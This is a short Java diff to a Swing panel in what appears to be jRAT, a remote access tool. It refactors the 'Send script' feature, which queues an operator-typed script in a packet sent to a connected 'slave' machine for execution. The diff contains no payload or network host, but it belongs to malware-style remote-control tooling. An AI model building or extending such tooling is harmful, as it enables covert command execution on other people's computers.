@@ -15,25 +15,24 @@ import javax.swing.JTextPane;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
-import se.jrat.client.Script;
 import se.jrat.client.Slave;
+import se.jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import se.jrat.client.packets.outgoing.Packet35Script;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.common.script.Script;
 
 
 @SuppressWarnings("serial")
 public class PanelControlScript extends PanelControlParent {
 
-	public int type;
+	public Script type;
 	public ImageIcon icon;
 	private JTextPane textPane;
 
-	public PanelControlScript(Slave slave, int type) {
+	public PanelControlScript(Slave slave, Script type) {
 		super(slave);
 		this.type = type;
-		this.icon = Script.getIcon(type);
-
-		final Slave sl = slave;
-		final int t = type;
+		this.icon = null; //TODO
 
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
@@ -41,7 +40,7 @@ public class PanelControlScript extends PanelControlParent {
 		JButton btnSendScript = new JButton("Send script");
 		btnSendScript.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Script.sendScript(sl, t, textPane.getText());
+				send();
 			}
 		});
 		btnSendScript.setIcon(this.icon);
@@ -79,5 +78,11 @@ public class PanelControlScript extends PanelControlParent {
 		textPane = new JTextPane();
 		scrollPane.setViewportView(textPane);
 		setLayout(groupLayout);
+	}
+	
+	public void send() {
+		AbstractOutgoingPacket packet = new Packet35Script(type, textPane.getText());
+		
+		slave.addToSendQueue(packet);
 	}
 }
